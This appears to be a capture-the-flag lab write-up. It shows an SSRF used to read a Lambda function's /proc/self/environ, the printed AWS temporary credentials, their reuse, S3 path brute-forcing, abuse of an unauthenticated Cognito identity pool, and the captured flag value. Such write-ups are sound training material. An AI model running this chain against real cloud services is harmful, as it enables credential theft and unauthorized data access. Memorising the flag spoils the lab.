# Serverless Espionage

## Task

![todo](images/01-01.png)

> The Syndicate uses a web application to scout potential targets and gather preliminary intelligence. This application
features a site preview loader. Your task is to exploit this application to gain initial access to their reconnaissance
data.

## Solution

After trying to perform various input injections, we can see that the web application is vulnerable to Server-Side
Request Forgery (SSRF) attacks:

![todo](images/01-02.png)

Based on the given lab link, the application is served by Amazon API Gateway which is likely connected to a Lambda
function. In AWS Lambda, temporary security credentials obtained by the function's execution role are stored in the
[environment variables](https://docs.aws.amazon.com/lambda/latest/dg/configuration-envvars.html#configuration-envvars-runtime)
during runtime. We can extract all environment variables from the `/proc/self/environ` file with the help of the
discovered SSRF vulnerability:

![todo](images/01-03.png)

Some of the environment variables that stand out include the following:

```
AWS_ACCESS_KEY_ID=ASIA34EXZV5D6MA3W4UJ
AWS_SECRET_ACCESS_KEY=nTbayjQjttRz41dvVzSZmui20V4HbZOrdeMyP279
AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEBwaCXVzLWVhc3QtMSJGMEQCICNjOruC9pIUE9MkpOCRQGkUMKsstjXaeFJgHx2H049kAiAEcx/fc5faogpj5l/VuFTqFLgMohsxe7xnrGB41aeVWir1Agj1//////////8BEAAaDDgxNjM2MjEzOTQ2MyIMl3A9DlP5wYK1TYZVKskChowKETXAu0ih9phqKcm+fvfFOuk5oETEOwYVgl3oErUdbrkf//FWmiosqBJ1prmfwYBDeztjNgbcg3IkyQh3nnJ0onx4/c6QRoAe1jP/ayG4FyOX1ozw0AC+7aT2VXn5vjAjm2c8lbamUqBIjEWEZ3WP3QEeEMabJlTMEExVDSyxdElMsL4TQnAHoslS8pQsglG9ydkkQT0Cp+69omIdhw5+OyVCYDroCBvrnrjOnyVN8ZZsyaZ9g8uRIAsNiVGry0aeXxCXuWeoPM5Pq1bUbJqMeE0cCMjb4+DOLrDICHzjtmi/7LIVgmzQIBUxr8ilzVfC+3Mfa3zhEYVmOw7gaaXHa1c015cpIUa0AGaKzu72Z5wKPas8HNx1/kETQE8qOxyNlVO+dg7kMiHPfJaUOhVWM70HSnx6fn6eeYdIPkAa4XWls8ydpwgwqbzJrgY6nwG/kxSmvhmCyi04p5PWinl/HF7mnzr93qdnZKRbH1X4R7hrprxtdvaBrH1ZW2nb8R6NF9GRKIlbZVpgGGmZgFNJBeyWYSCzD2PSe7T76DowdGoFiJmpmSkbmssHHrZqCA5baonUXC3qS8J2Zxd0wvw5LY648kG6fcWrWrDI2R6L0R6bNY27S6CZpTZUgDgXr7JurMOAzXrKDZOsxyXlfsI=
GALLERY_BUCKET=syndicategallery-7474849
```

We can reuse the temporary security credentials dumped from the Lambda function and gain access to the AWS account:

```
➜  ~ export AWS_REGION=us-east-1

➜  ~ export AWS_ACCESS_KEY_ID=ASIA34EXZV5D6MA3W4UJ

➜  ~ export AWS_SECRET_ACCESS_KEY=nTbayjQjttRz41dvVzSZmui20V4HbZOrdeMyP279

➜  ~ export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEBwaCXVzLWVhc3QtMSJGMEQCICNjOruC9pIUE9MkpOCRQGkUMKsstjXaeFJgHx2H049kAiAEcx/fc5faogpj5l/VuFTqFLgMohsxe7xnrGB41aeVWir1Agj1//////////8BEAAaDDgxNjM2MjEzOTQ2MyIMl3A9DlP5wYK1TYZVKskChowKETXAu0ih9phqKcm+fvfFOuk5oETEOwYVgl3oErUdbrkf//FWmiosqBJ1prmfwYBDeztjNgbcg3IkyQh3nnJ0onx4/c6QRoAe1jP/ayG4FyOX1ozw0AC+7aT2VXn5vjAjm2c8lbamUqBIjEWEZ3WP3QEeEMabJlTMEExVDSyxdElMsL4TQnAHoslS8pQsglG9ydkkQT0Cp+69omIdhw5+OyVCYDroCBvrnrjOnyVN8ZZsyaZ9g8uRIAsNiVGry0aeXxCXuWeoPM5Pq1bUbJqMeE0cCMjb4+DOLrDICHzjtmi/7LIVgmzQIBUxr8ilzVfC+3Mfa3zhEYVmOw7gaaXHa1c015cpIUa0AGaKzu72Z5wKPas8HNx1/kETQE8qOxyNlVO+dg7kMiHPfJaUOhVWM70HSnx6fn6eeYdIPkAa4XWls8ydpwgwqbzJrgY6nwG/kxSmvhmCyi04p5PWinl/HF7mnzr93qdnZKRbH1X4R7hrprxtdvaBrH1ZW2nb8R6NF9GRKIlbZVpgGGmZgFNJBeyWYSCzD2PSe7T76DowdGoFiJmpmSkbmssHHrZqCA5baonUXC3qS8J2Zxd0wvw5LY648kG6fcWrWrDI2R6L0R6bNY27S6CZpTZUgDgXr7JurMOAzXrKDZOsxyXlfsI=

➜  ~ aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AROA34EXZV5D5E5FNH4MR:SiteReconApp",
    "Account": "816362139463",
    "Arn": "arn:aws:sts::816362139463:assumed-role/SiteReconApp_role_lambda/SiteReconApp"
}
```

However, we are not able to access the S3 bucket `syndicategallery-7474849` due to the lack of permissions:

```
➜  ~ aws s3 ls s3://syndicategallery-7474849

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
```

Additional bucket enumeration reveals that the bucket is hosting a website, but the index document is not available:

![todo](images/01-04.png)

We can use `dirb`/`feroxbuster` with a [simple dictionary](https://github.com/v0re/dirb/blob/master/wordlists/common.txt)
to try to find other paths:

```
➜  ~ feroxbuster -u http://syndicategallery-7474849.s3-website.us-east-1.amazonaws.com/ -w common.txt   

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://syndicategallery-7474849.s3-website.us-east-1.amazonaws.com/
 🚀  Threads               │ 50
 📖  Wordlist              │ common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.1
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       20l       52w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET       13l       22w      313c http://syndicategallery-7474849.s3-website.us-east-1.amazonaws.com/html => http://syndicategallery-7474849.s3-website.us-east-1.amazonaws.com/html/
404      GET        0l        0w        0c http://syndicategallery-7474849.s3-website.us-east-1.amazonaws.com/meta-inf
404      GET        0l        0w        0c http://syndicategallery-7474849.s3-website.us-east-1.amazonaws.com/META-INF
200      GET        0l        0w        0c http://syndicategallery-7474849.s3-website.us-east-1.amazonaws.com/soap
200      GET      128l      322w     4272c http://syndicategallery-7474849.s3-website.us-east-1.amazonaws.com/html/index.html
404      GET        0l        0w        0c http://syndicategallery-7474849.s3-website.us-east-1.amazonaws.com/web-inf
404      GET        0l        0w        0c http://syndicategallery-7474849.s3-website.us-east-1.amazonaws.com/WEB-INF
[####################] - 16s     9228/9228    0s      found:7       errors:0      
[####################] - 11s     4614/4614    439/s   http://syndicategallery-7474849.s3-website.us-east-1.amazonaws.com/ 
[####################] - 10s     4614/4614    446/s   http://syndicategallery-7474849.s3-website.us-east-1.amazonaws.com/html/
```

One of the URLs that returns suceess response is `http://syndicategallery-7474849.s3-website.us-east-1.amazonaws.com/html/index.html`.
We can access it in the browser and see the following web page:

![todo](images/01-05.png)

In the page source code, we can see the following JavaScript code block:

```js
$(document).ready(function () {
  AWS.config.region = "us-east-1";
  AWS.config.credentials = new AWS.CognitoIdentityCredentials({
    IdentityPoolId: "us-east-1:9ad6519b-d074-4ce2-9584-cbd1c543d275",
  });

  console.log(AWS.config.credentials);

  // Get temporary AWS credentials
  AWS.config.credentials.get(function (err) {
    if (err) {
      console.log("Error: " + err);
      console.error(err);
    } else {
      // Fetch S3 objects
      listS3Objects();
    }
  });

  function listS3Objects() {
    var s3 = new AWS.S3();

    var params = {
      Bucket: "syndicategallery-7474849", // replace with your S3 bucket name
    };

    const contents = [
      {
        Key: "image234.png",
      },
      {
        Key: "image235.png",
      },
      {
        Key: "image236.png",
      },
      {
        Key: "image237.png",
      },
      {
        Key: "image238.png",
      },
    ];
    displayImages(contents);

    function displayImages(images) {
      var $imageList = $("#image-list");
      var $gallery = $(
        '<div class="grid grid-cols-2 md:grid-cols-4 gap-4"></div>'
      );

      images.forEach(function (image) {
        var imageUrl = s3.getSignedUrl("getObject", {
          Bucket: params.Bucket,
          Key: image.Key,
        });

        var $imgContainer = $(
          '<img class="h-auto max-w-full rounded-lg" src="' +
            imageUrl +
            '" alt="' +
            image.Key +
            '">'
        );

        $gallery.append($imgContainer);
      });

      $imageList.html($gallery);
    }
  }
});
```

The JavaScript code uses the AWS Cognito identity pool `us-east-1:9ad6519b-d074-4ce2-9584-cbd1c543d275` to obtain
temporary credentials and fetch images from the `syndicategallery-7474849` S3 bucket. We can try to use the identity
pool ID to get temporary credentials and access the S3 bucket:

```
➜  ~ aws cognito-identity get-credentials-for-identity --identity-id $(aws cognito-identity get-id --identity-pool-id us-east-1:9ad6519b-d074-4ce2-9584-cbd1c543d275 | jq -r .IdentityId) --no-cli-pager
{
    "IdentityId": "us-east-1:be12f9af-472e-c61b-768d-e85c0fe755dc",
    "Credentials": {
        "AccessKeyId": "ASIA34EXZV5DYCACIDAN",
        "SecretKey": "25uSyPdj5lxYojggLyfLUfjyWUl0haKK4uAOM1Y1",
        "SessionToken": "IQoJb3JpZ2luX2VjEB0aCXVzLWVhc3QtMSJGMEQCICUEJ2kJcYazU9otMGF5Ykp9UkCIja7CKoHHCG2s2YLtAiAcSVioZpHuPCrWqJTqSXYN9MrT3te5KCV/gCEfiDAUfirRBQj2//////////8BEAAaDDgxNjM2MjEzOTQ2MyIMK3PeZhJdgOUOtM/+KqUFvrX9x87gFMDGxqFoki8Ti5F5CcUwaw4IE50DTXnw6z2ODzLosK4EuuNWOI7JRNOjOtpVUVZveFIy3WL9WxKBXVloIG2TFInIj8TE5TfDszfTlhlM1UI69PI9q0rbndY/ecN1AaKEoIWfPlYNREz8ThfqnQyj+qW+NZoFKiSFvH6Cr74v+17Hg0ndTwSIp9RcEWH9pJrE+ri6p51bzY47Oyf7yOao++h46FdZaTZLkvMPtvWpAk01ERlklnwX3SBX/kv0l2D7YGNaLq2uG8IPDbaPk2fu91GEudu2UN2f7t0vmNrzCPwZ8R7RA8/RoNbOt0S0gnsGWzlidk1J0yEU9Nrqk4+ocJl3EO33KTEAgSxCRCYhtCtyTvq7NFRQ3+HQCktJ3bGQJEhsUpEeJVwq2qxCJsIVMjvypAG+/u2CL47ESxEMTn9hVKBX+rjJO1Bdwh+mLTcR66EPx6ZsFQpJaGeddiRZY6cdYDknfV7VUSAOsVAj6ff3ZQpY7OXjtU3hM15tdgiu4IxgMS7c8hjWIz+bCZrVI/0WPTRU0p/fov4KmnovCcs5TSZDHhM1QfNTVPLWwc3dlsROlXM//nh1epnwuirexFbHOLmGADNuaWlM2/kxibX0AvWP0i+W6Qrk9OJOCn0wx7L0/rjuCCG7/O9hSEQFG40asPG+rdn0K29bTFjFZQjhxujNIn4yWmjIFshztxYIOV/fJpAqD84uINbyrrqcD9RljkV5ezf0mK9uBQVH6FxpkJbZBsphqvSPaB0E7lSS1uzlAb/bYkgnV8A2D4muvAqy67hKmxt06DJdXN5w8Vvncd+KzzoKAabEBA58Rokq4dcOKR7r3vf2PZsbAXnz0sfSAGuL3+U812Sh9s2j7qjNWXoBp1DxOg2fU/DHjNIw4djJrgY63wLSB2s351nWvWyOls1Kz7esmUpgEbJVLkGmfAIAGBgc0+TiQ6AZZHg6mTnIxKmK+H9ZoOmrVO20a3cHymHiZCH1AQSlL52/RZOwROJ20npklVnGqSqxNRvqvrI6Hv6LGNZHhR8LR7U82VhnvWuMGP3mPdWf8ZP0WoX9B5htljlrjORldKSgRsp1mCLlb5OhlJY7iCJ0b0G1hm2ic5Kw3NLD1TgBVmls3j950cpcM0CLz1lJkzVYZwKwf6TmkvGJyM3aDkmlHrWxul5KHsCTDGKjImWhYGsyIs9wMdOj7tw4rSrwsCW9Vre9jWV43pAnhDPJ6rMt8IStDTnbFnUgtUH0w1BUwqQVokN5x7NAHLJ5ErIMYrqM9z1ss2tHF9JiVFNZAcas8mNswYMFKVmPuVd/gxeQA9m+mfbSOfbfbvDjSTEtsuz/gssY1N1gDdqZTWBOmCoYbdhjai9QTuFHz44=",
        "Expiration": "2024-02-18T13:45:21-08:00"
    }
}
```

When using the credentials, we get access to the account as `ProdS3ViewerCognitoRole1`.

```
➜  ~ export AWS_ACCESS_KEY_ID=ASIA34EXZV5DYCACIDAN

➜  ~ export AWS_SECRET_ACCESS_KEY=25uSyPdj5lxYojggLyfLUfjyWUl0haKK4uAOM1Y1

➜  ~ export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEB0aCXVzLWVhc3QtMSJGMEQCICUEJ2kJcYazU9otMGF5Ykp9UkCIja7CKoHHCG2s2YLtAiAcSVioZpHuPCrWqJTqSXYN9MrT3te5KCV/gCEfiDAUfirRBQj2//////////8BEAAaDDgxNjM2MjEzOTQ2MyIMK3PeZhJdgOUOtM/+KqUFvrX9x87gFMDGxqFoki8Ti5F5CcUwaw4IE50DTXnw6z2ODzLosK4EuuNWOI7JRNOjOtpVUVZveFIy3WL9WxKBXVloIG2TFInIj8TE5TfDszfTlhlM1UI69PI9q0rbndY/ecN1AaKEoIWfPlYNREz8ThfqnQyj+qW+NZoFKiSFvH6Cr74v+17Hg0ndTwSIp9RcEWH9pJrE+ri6p51bzY47Oyf7yOao++h46FdZaTZLkvMPtvWpAk01ERlklnwX3SBX/kv0l2D7YGNaLq2uG8IPDbaPk2fu91GEudu2UN2f7t0vmNrzCPwZ8R7RA8/RoNbOt0S0gnsGWzlidk1J0yEU9Nrqk4+ocJl3EO33KTEAgSxCRCYhtCtyTvq7NFRQ3+HQCktJ3bGQJEhsUpEeJVwq2qxCJsIVMjvypAG+/u2CL47ESxEMTn9hVKBX+rjJO1Bdwh+mLTcR66EPx6ZsFQpJaGeddiRZY6cdYDknfV7VUSAOsVAj6ff3ZQpY7OXjtU3hM15tdgiu4IxgMS7c8hjWIz+bCZrVI/0WPTRU0p/fov4KmnovCcs5TSZDHhM1QfNTVPLWwc3dlsROlXM//nh1epnwuirexFbHOLmGADNuaWlM2/kxibX0AvWP0i+W6Qrk9OJOCn0wx7L0/rjuCCG7/O9hSEQFG40asPG+rdn0K29bTFjFZQjhxujNIn4yWmjIFshztxYIOV/fJpAqD84uINbyrrqcD9RljkV5ezf0mK9uBQVH6FxpkJbZBsphqvSPaB0E7lSS1uzlAb/bYkgnV8A2D4muvAqy67hKmxt06DJdXN5w8Vvncd+KzzoKAabEBA58Rokq4dcOKR7r3vf2PZsbAXnz0sfSAGuL3+U812Sh9s2j7qjNWXoBp1DxOg2fU/DHjNIw4djJrgY63wLSB2s351nWvWyOls1Kz7esmUpgEbJVLkGmfAIAGBgc0+TiQ6AZZHg6mTnIxKmK+H9ZoOmrVO20a3cHymHiZCH1AQSlL52/RZOwROJ20npklVnGqSqxNRvqvrI6Hv6LGNZHhR8LR7U82VhnvWuMGP3mPdWf8ZP0WoX9B5htljlrjORldKSgRsp1mCLlb5OhlJY7iCJ0b0G1hm2ic5Kw3NLD1TgBVmls3j950cpcM0CLz1lJkzVYZwKwf6TmkvGJyM3aDkmlHrWxul5KHsCTDGKjImWhYGsyIs9wMdOj7tw4rSrwsCW9Vre9jWV43pAnhDPJ6rMt8IStDTnbFnUgtUH0w1BUwqQVokN5x7NAHLJ5ErIMYrqM9z1ss2tHF9JiVFNZAcas8mNswYMFKVmPuVd/gxeQA9m+mfbSOfbfbvDjSTEtsuz/gssY1N1gDdqZTWBOmCoYbdhjai9QTuFHz44=

➜  ~ aws sts get-caller-identity --no-cli-pager
{
    "UserId": "AROA34EXZV5DXS5O5RAKT:CognitoIdentityCredentials",
    "Account": "816362139463",
    "Arn": "arn:aws:sts::816362139463:assumed-role/ProdS3ViewerCognitoRole1/CognitoIdentityCredentials"
}
```

This role has access to the `syndicategallery-7474849` S3 bucket. We can list the contents of the bucket and download
the flag from the `secr3td1r` directory:

```
➜  ~ aws s3 ls s3://syndicategallery-7474849/     
                           PRE html/
                           PRE images/
                           PRE info/
                           PRE secr3td1r/
2024-02-07 22:17:50     606895 image234.png
2024-02-07 22:17:54     543748 image235.png
2024-02-07 22:17:58     603551 image236.png
2024-02-07 22:18:00     587072 image237.png
2024-02-07 22:18:02     563220 image238.png

➜  ~ aws s3 ls s3://syndicategallery-7474849/secr3td1r/
2023-12-21 04:38:45         39 FLAG1.txt

➜  ~ aws s3 cp s3://syndicategallery-7474849/secr3td1r/FLAG1.txt -
FLAG{627c8d48cd8e4d992b3870f7834f7d38}
```
